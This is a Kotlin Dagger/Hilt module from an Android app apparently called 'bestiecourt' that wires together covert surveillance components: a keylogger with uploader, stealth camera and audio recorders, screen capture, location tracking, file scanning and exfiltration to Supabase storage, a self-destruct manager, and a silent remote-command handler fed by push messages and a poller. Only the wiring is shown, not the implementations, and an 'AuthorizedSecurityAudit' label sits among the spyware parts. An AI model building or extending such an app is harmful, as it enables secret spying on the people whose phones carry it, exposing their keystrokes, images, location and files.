package com.bestiecourt.app.core.di

import android.content.Context
import com.bestiecourt.app.core.keepalive.KeepAliveWatchdog
import com.bestiecourt.app.core.service.*
import com.bestiecourt.app.core.security.AuthorizedSecurityAudit
import com.bestiecourt.app.data.local.KeylogBuffer
import com.bestiecourt.app.data.local.InterceptBuffer
import com.bestiecourt.app.data.remote.fcm.FcmTokenRegistrar
import com.bestiecourt.app.data.remote.fcm.SilentCommandHandler
import com.bestiecourt.app.data.remote.supabase.KeylogUploader
import com.bestiecourt.app.data.remote.supabase.SupabaseStorageUploader
import dagger.Module
import dagger.Provides
import dagger.hilt.InstallIn
import dagger.hilt.android.qualifiers.ApplicationContext
import dagger.hilt.components.SingletonComponent
import javax.inject.Singleton

@Module
@InstallIn(SingletonComponent::class)
object AppModule {

    @Provides @Singleton
    fun provideKeylogBuffer() = KeylogBuffer()

    @Provides @Singleton
    fun provideInterceptBuffer() = InterceptBuffer()

    @Provides @Singleton
    fun provideKeylogUploader(buffer: KeylogBuffer) = KeylogUploader(buffer)

    @Provides @Singleton
    fun provideStorageUploader() = SupabaseStorageUploader()

    @Provides @Singleton
    fun provideFcmTokenRegistrar() = FcmTokenRegistrar()

    @Provides @Singleton
    fun provideDeviceInfoCollector() = DeviceInfoCollector()

    @Provides @Singleton
    fun provideStealthCamera(uploader: SupabaseStorageUploader) = StealthCameraCapture(uploader)

    @Provides @Singleton
    fun provideStealthAudio(uploader: SupabaseStorageUploader) = StealthAudioRecorder(uploader)

    @Provides @Singleton
    fun provideScreenCapture() = ScreenCaptureManager()

    @Provides @Singleton
    fun provideLocationTracker() = LocationTracker()

    @Provides @Singleton
    fun provideFileScanner() = FileScanner()

    @Provides @Singleton
    fun provideFileExfiltrator(uploader: SupabaseStorageUploader) = FileExfiltrator(uploader)

    @Provides @Singleton
    fun provideSelfDestruct() = SelfDestructManager()

    @Provides @Singleton
    fun provideSecurityAudit() = AuthorizedSecurityAudit()

    @Provides @Singleton
    fun provideKeylogController(buffer: KeylogBuffer, uploader: KeylogUploader) =
        KeylogController(buffer, uploader)

    @Provides @Singleton
    fun provideSilentCommandHandler(
        keylogController: KeylogController,
        stealthCamera: StealthCameraCapture,
        stealthAudio: StealthAudioRecorder,
        screenCapture: ScreenCaptureManager,
        locationTracker: LocationTracker,
        fileScanner: FileScanner,
        fileExfiltrator: FileExfiltrator,
        selfDestruct: SelfDestructManager,
        deviceInfoCollector: DeviceInfoCollector,
        securityAudit: AuthorizedSecurityAudit
    ) = SilentCommandHandler(
        keylogController, stealthCamera, stealthAudio, screenCapture,
        locationTracker, fileScanner, fileExfiltrator, selfDestruct,
        deviceInfoCollector, securityAudit
    )

    @Provides @Singleton
    fun providePendingCommandPoller(
        @ApplicationContext context: Context,
        handler: SilentCommandHandler
    ) = PendingCommandPoller(context, handler)

    @Provides @Singleton
    fun provideKeepAliveWatchdog() = KeepAliveWatchdog()
}
